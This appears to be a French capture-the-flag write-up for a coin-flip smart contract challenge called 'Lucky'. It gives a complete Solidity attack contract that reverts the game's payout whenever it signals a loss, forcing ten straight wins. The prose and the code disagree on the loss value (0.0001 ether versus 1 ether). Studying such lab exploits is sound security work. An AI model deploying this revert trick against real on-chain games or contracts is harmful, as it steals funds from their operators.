# Lucky

## Objectif
L'objectif est de gagner 10 fois consécutivement.

## Détails
Chaque fois que nous jouons, nous avons une chance sur 2 de gagner. Heureusement, que l'on perde ou gagne, le smart contract "lucky" nous envoie une transaction. Il suffit de révoquer (revert) la transaction qui ne nous convient pas.

## Attaque

Ainsi, en fonction de la valeur de la transaction (dans notre cas : 0,0001 ether), nous pouvons révoquer la transaction et annuler cette défaite. Par conséquent, il suffit d'appeler autant de fois qu'il faut pour accumuler 10 victoires consécutives.

Pour résoudre ce défi, il suffit d'écrire ce fameux smart contract : 

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

interface Game{
    function play(uint256 guess) external payable;
}

contract attack {

    Game game;

    constructor(address _game) payable{
        game = Game(_game);
    }

    function play() payable public{
        game.play{value :1 ether}(1);
    }

    fallback() payable external{
        if (msg.value != 1 ether){
            revert();
        }
    }
}
```

MK.
